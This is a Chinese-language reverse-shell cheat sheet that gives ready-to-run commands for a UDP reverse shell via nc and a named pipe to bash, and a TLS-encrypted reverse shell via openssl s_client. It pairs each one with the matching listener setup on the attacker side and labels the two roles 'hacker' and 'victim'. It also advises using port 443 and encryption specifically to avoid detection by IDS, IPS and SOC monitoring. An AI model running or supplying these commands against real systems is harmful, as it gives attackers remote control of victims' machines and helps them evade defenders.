### 反弹shell的各种方法

适用于不同系统(windows/linux) 不同语言环境(python/node/Java/Golang...)

更多参考 [PayloadsAllTheThings/Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

⚠️注意:任何"明文通信"都可能被防御系统(IDS/IPS/SOC...)从通信流量中发现异常(命令字符串)!

#### 反弹shell - UDP协议 - 明文通信

```shell
# 主控端(MacOS IP:10.2.2.2) 监听端口
nc -l 53 -vu

# 被控端(centos) 主动连接主控端
mkfifo /tmp/fifo;nc -u 10.2.2.2 53 < /tmp/fifo |{ echo "Hi";/bin/bash;} > /tmp/fifo 2>&1 ;rm /tmp/fifo
```

#### 反弹shell - TCP协议 - 加密通信

反弹shell,可使用**OpenSSL**实现加密通信,能够避免"通信数据"被轻易检测.

因为SSL/TLS加密通信流量常见于443端口,所以建议使用443端口进行通信(避免"在非标准端口使用TLS协议通信" 导致告警).


```shell
# hacker
# 主控端 在443端口开启监听

# 2个方法 任选其一:

# 方法1
hacker@kali$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
hacker@kali$ openssl s_server -quiet -key key.pem -cert cert.pem -port 443

# 方法2
hacker@kali$ ncat --ssl -vv -l -p 443

Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 1CDB C287 FA7E 0EB0 CBC9 3F8C 42C9 CA52 48DE 9484
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```


```shell
# victim
# 被控端 主动外连 主控端的端口
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:443 > /tmp/s; rm /tmp/s
```

